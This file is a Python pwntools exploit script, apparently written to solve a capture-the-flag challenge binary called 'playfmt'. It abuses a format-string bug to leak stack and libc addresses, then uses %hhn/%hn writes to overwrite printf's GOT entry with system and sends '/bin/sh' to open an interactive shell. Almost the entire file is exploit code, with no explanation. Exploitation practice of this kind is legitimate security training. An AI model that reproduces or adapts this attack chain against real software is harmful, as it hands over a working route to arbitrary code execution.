#coding=utf-8
from pwn import*
context(os='linux',arch='i386')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./playfmt')
libc = ELF('./libc-2.23.so')
elf = ELF('./playfmt')

def pr(a,addr):
	log.success(a+': '+hex(addr))

printf_got = 0x0804A010

p.recvuntil('=====================\n')
p.recvuntil("=====================\n")

payload = "%6$p\n%15$p"
p.sendline(payload)
point_ebp = int(p.recvuntil('\n').strip(), 16)
pr('point_ebp',point_ebp)
start_main = int(p.recvuntil('\n').strip(), 16) - 247
libcbase = start_main - libc.sym['__libc_start_main']
system = libc.sym['system'] + libcbase
pr('libcbase',libcbase)
pr('system',system)

ebp = point_ebp - 0x10
point_got = ebp + 12
ret = ebp + 4

def change_addr(addr1, addr2):
	payload = b'%' + str(addr1).encode() + b'c%6$hhn' 
	p.send(payload)
	p.recv()
	payload = b'%' + str(addr2).encode() + b'c%10$hhn'
	p.send(payload)
	p.recv()

change_addr(point_got & 0xff, printf_got & 0xff) #point_got修改低位为：0x10
change_addr((point_got+1) & 0xff, (printf_got & 0xffff)>>8) #point_got修改第二低位为：0xa0
change_addr(ret & 0xff, (printf_got & 0xff)+2) #ret低位修改为：0x12
change_addr((ret+1) & 0xff, (printf_got & 0xffff)>>8) #ret修改第二低位为：0xa0

payload  = b'%' + str(system & 0xffff).encode() + b'c%9$hn'
payload += b'%' + str((system >> 16) - (system & 0xffff)).encode() + b'c%7$hhn' #
p.send(payload)
p.recv()

pause()
payload = "/bin/sh;"
p.send(payload)

p.interactive()

